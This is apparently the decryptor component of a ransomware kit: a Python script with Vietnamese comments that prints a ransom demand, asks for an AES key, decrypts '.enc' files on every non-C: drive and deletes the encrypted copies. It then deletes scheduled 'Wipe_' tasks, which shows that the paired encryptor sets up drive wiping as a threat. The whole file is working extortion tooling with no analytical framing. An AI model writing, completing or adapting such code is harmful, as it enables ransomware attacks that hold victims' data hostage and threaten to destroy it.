import os, string, subprocess
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def cancel_drive_wipe(drives):
    for drive in drives:
        task_name = f"Wipe_{drive[0]}"
        try:
            subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True)
            print(f"[+] Đã hủy lịch xóa ổ {drive}")
        except Exception as e:
            print(f"[-] Không thể hủy task {task_name}: {e}")

def main():
    print("Please send me 100,00$ and I will send you the key: ")
    key = input("Key: ").encode()  
    
    try:
        block = algorithms.AES(key)
    except ValueError as e:
        print("error while setting up aes:", str(e))
        return
    backend = default_backend()

    drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    decrypted_any = False  # Flag kiểm tra có file nào được giải mã không

    for drive in drives:
        if drive == "C:\\": 
            continue
        for root, dirs, files in os.walk(drive):
            for file_name in files:
                if not file_name.endswith(".enc"):
                    continue
                decrypted_any = True
                path = os.path.join(root, file_name)
                print(f"Decrypting {path}...")
                try:
                    with open(path, 'rb') as f:
                        data = f.read()
                    nonce = data[:12]
                    tag = data[-16:]
                    ciphertext = data[12:-16]
                    gcm = modes.GCM(nonce, tag)
                    cipher = Cipher(block, gcm, backend=backend)
                    decryptor = cipher.decryptor()
                    original = decryptor.update(ciphertext) + decryptor.finalize()
                    output_path = path[:-4]
                    with open(output_path, 'wb') as f:
                        f.write(original)
                    os.remove(path)
                except Exception as e:
                    print(f"Error: {e}")

    if decrypted_any:
        cancel_drive_wipe(drives)  # Hủy tất cả task xóa sau khi giải mã

if __name__ == "__main__":
    main()
